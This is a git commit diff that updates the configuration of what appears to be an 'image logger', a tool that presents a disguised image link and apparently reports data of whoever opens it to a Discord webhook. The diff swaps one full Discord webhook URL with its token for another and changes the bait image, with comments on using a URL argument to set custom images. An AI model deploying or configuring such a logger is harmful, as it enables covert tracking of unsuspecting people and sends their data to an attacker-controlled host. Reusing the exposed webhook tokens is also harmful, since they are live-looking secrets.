3986c66cb4decba08923e733c4146d507b286aaa
Mewtwo1908 <camdencorradini@gmail.com>
2025-11-24 00:55:51 -0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1442392005346070609/ka71WUFzaVIa75EqOin0TyYt8dRvisinUuR1f5m-U8LPAA0NUdEqDMPVtrhl87DskJaK",
+    "image": "https://media.tenor.com/7KpPFEO4uTgAAAAM/pica-pica-funny.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
